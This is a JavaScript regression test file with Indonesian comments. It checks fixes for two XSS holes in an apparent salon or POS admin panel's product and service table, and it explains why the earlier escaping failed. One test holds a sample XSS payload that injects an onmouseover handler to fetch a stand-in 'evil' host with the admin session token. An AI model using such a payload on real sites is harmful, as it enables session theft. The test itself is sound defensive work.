import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

// Dua celah XSS terpisah di tabel Produk/Layanan admin (public/js/admin.js),
// keduanya lolos dari perbaikan esc() sebelumnya (PR #35, kutip tunggal ->
// entity HTML) karena akar masalahnya bukan di esc() itu sendiri:
//
// 1. Tombol Edit menyisipkan objek MENTAH lewat JSON.stringify(p) langsung ke
//    atribut onclick, tanpa lewat esc() sama sekali. JSON.stringify tidak
//    pernah meng-escape kutip TUNGGAL, jadi nama produk/layanan berisi `'`
//    (mis. hasil import CSV vendor POS, "Kids' Cut") memutus string JS di
//    onclick dan bisa menyuntik JS bebas di sesi admin yang login.
//
// 2. Tombol Hapus menyisipkan nama lewat esc() ke ATRIBUT onclick berkutip
//    tunggal. esc() meng-escape `'` jadi entity HTML (&#39;), tapi browser
//    men-decode entity HTML pada NILAI ATRIBUT sebelum isinya diparse sebagai
//    JavaScript -- jadi &#39; kembali jadi ' persis sebelum onclick dieksekusi,
//    dan escaping itu tidak pernah benar-benar mencegah pemutusan string JS.
//
// Perbaikan: kedua tombol tidak lagi menyisipkan data produk/layanan ke
// dalam kode JS di atribut onclick sama sekali.
// - Edit: onclick cuma bawa id (di-esc untuk konteks HTML biasa), fungsi
//   editProduct(id)/editPrice(id) mencari objek aslinya dari cache
//   PRODUCTS/PRICELIST yang diisi loadProducts()/loadPricelist().
// - Hapus: id & nama ditaruh di atribut data-id/data-name (konteks HTML
//   biasa, esc() tepat di situ), onclick jadi string STATIS
//   ("delProduct(this.dataset.id,this.dataset.name)") tanpa interpolasi.
//
// Tes ini memuat SUMBER ASLI admin.js (bukan salinan tertulis ulang) supaya
// menguji kode yang sungguh dikirim ke browser.

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const src = readFileSync(path.join(root, 'public/js/admin.js'), 'utf8');

test('tombol Edit produk/layanan tidak lagi memakai JSON.stringify() di dalam onclick', () => {
  assert.doesNotMatch(src, /onclick=.editProduct\(\$\{JSON\.stringify/);
  assert.doesNotMatch(src, /onclick=.editPrice\(\$\{JSON\.stringify/);
});

test('tombol Edit produk/layanan mengirim id (di-esc) ke editProduct/editPrice', () => {
  assert.match(src, /onclick="editProduct\('\$\{esc\(p\.id\)\}'\)"/);
  assert.match(src, /onclick="editPrice\('\$\{esc\(h\.id\)\}'\)"/);
});

test('editProduct(id)/editPrice(id) menerima id, bukan objek, dan mencari dari cache', () => {
  assert.match(src, /function editProduct\(id\)\{/);
  assert.match(src, /PRODUCTS\.find\(x=>x\.id===id\)/);
  assert.match(src, /function editPrice\(id\)\{/);
  assert.match(src, /PRICELIST\.find\(x=>x\.id===id\)/);
});

test('tombol Hapus produk/layanan tidak lagi menyisipkan nama langsung ke string onclick', () => {
  assert.doesNotMatch(src, /onclick="delProduct\('\$\{p\.id\}','\$\{esc\(p\.name\)\}'\)"/);
  assert.doesNotMatch(src, /onclick="delPrice\('\$\{h\.id\}','\$\{esc\(h\.name\)\}'\)"/);
});

test('tombol Hapus produk/layanan memakai data-id/data-name + onclick statis lewat this.dataset', () => {
  assert.match(src, /data-id="\$\{esc\(p\.id\)\}" data-name="\$\{esc\(p\.name\)\}" onclick="delProduct\(this\.dataset\.id,this\.dataset\.name\)"/);
  assert.match(src, /data-id="\$\{esc\(h\.id\)\}" data-name="\$\{esc\(h\.name\)\}" onclick="delPrice\(this\.dataset\.id,this\.dataset\.name\)"/);
});

test('demonstrasi end-to-end: nama berkutip tunggal tidak lagi bisa memutus atribut onclick (delete)', () => {
  const esc = s => String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  const payload = `x' onmouseover='fetch("//evil/steal?t="+sessionStorage.getItem("rrhc_admin"))`;
  const id = 'p_123';
  const rendered = `data-id="${esc(id)}" data-name="${esc(payload)}" onclick="delProduct(this.dataset.id,this.dataset.name)"`;
  // onclick sendiri statis -- payload cuma pernah muncul di data-name, tak pernah dieksekusi sebagai JS.
  assert.equal(rendered.includes('onmouseover'), true); // muncul (di data-name), tapi...
  assert.doesNotMatch(rendered, /onclick="[^"]*onmouseover/); // ...tidak pernah masuk ke DALAM onclick.
});

test('demonstrasi end-to-end: JSON.stringify(objek) sudah tidak dipakai untuk edit (payload objek tak lagi diserialisasi ke onclick)', () => {
  // Sebelum fix: `onclick='editProduct(${JSON.stringify(p)})'` -- objek APA PUN,
  // termasuk nama berkutip tunggal, diserialisasi mentah ke dalam kode JS.
  // Sesudah fix: hanya id (string sederhana, sudah di-esc) yang masuk onclick.
  assert.doesNotMatch(src, /onclick='editProduct\(/);
  assert.doesNotMatch(src, /onclick='editPrice\(/);
});
